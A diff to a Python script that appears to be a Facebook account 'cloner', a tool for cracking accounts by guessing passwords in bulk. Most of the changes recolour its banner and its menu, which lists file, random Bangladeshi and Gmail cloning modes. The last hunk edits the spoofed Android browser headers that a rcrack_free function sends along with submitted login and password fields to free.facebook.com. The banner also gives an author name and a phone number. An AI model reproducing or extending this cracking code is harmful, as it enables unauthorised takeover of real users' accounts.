@@ -119,19 +119,19 @@ d8888b.  .d8b.  d8888b. db    db d88888b    d88b
     	print(logo)
     	menu_apikey()
 #menu_apikey()
-logo=(f"""\x1b[1;97m        
-d8888b.  .d8b.  d8888b. db    db d88888b    d88b 
-88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
-88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
-88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
-88      88   88 88 `88.  `8bd8'  88.     db. 88  
-88      YP   YP 88   YD    YP    Y88888P Y8888P  
+logo=(f"""       
+\033[1;32md8888b.  .d8b.  d8888b. db    db d88888b    d88b 
+\033[1;37m88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
+\033[1;32m88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
+\033[1;37m88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
+\033[1;32m88      88   88 88 `88.  `8bd8'  88.     db. 88  
+\033[1;37m88      YP   YP 88   YD    YP    Y88888P Y8888P  
   
     ┌───────────────────────────────────────┐
-    │ [✓] AUTHOR   : PARVEJ HOSSEN          │
-    │ [✓] GITHUB   : ROMAN-XXX              │
-    │ [✓] WHATSAPP : +8801608002168         │
-    │ [✓] VERSION  : 0.3                    │
+    │ [✓] AUTHOR   : \033[1;32mPARVEJ HOSSEN          │
+    │ [✓] GITHUB   :\033[1;37m ROMAN-XXX              │
+    │ [✓] WHATSAPP :\033[1;32m +8801608002168         │
+    │ [✓] VERSION  : \033[1;37m0.5                    │
     │ [✓] POWER BY : \033[1;32mPRO PRONOY \033[1;37m            │
     └───────────────────────────────────────┘""")
 
@@ -171,10 +171,10 @@ def ckx():
 def Spy():
 	clear()
 	#ckx()
-	print(f" [1] FILE Cloner (SYSTEM API) ")
-	print(f" [2] BD Random Cloner ")
-	print(f" [3] Gmail Cloning")
-	print(f" [0] Exit")
+	print(f" [1]\033[1;32m FILE Cloner (SYSTEM API) ")
+	print(f" [2]\033[1;37m BD Random Cloner ")
+	print(f" [3] \033[1;32m Cloning")
+	print(f" [0]\033[1;37m Exit")
 	me=input(f' Choice : ')
 	if me in ["2", "02"]:
 		bd()
@@ -681,13 +681,11 @@ def rcrack_free(idf,pwv):
 			"pass":ps,
 			"login":"Log In"}
 			header_freefb = {'authority': 'free.facebook.com',
-   'method':'GET',
-   'scheme':'https',
-   'path':'/?zero_e=3&zero_et=1680085301&_rdc=1&_rdr&refsrc=deprecated',
-   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'method':'GET',
+    'scheme':'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-   'referer': 'https://free.facebook.com/',
     'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
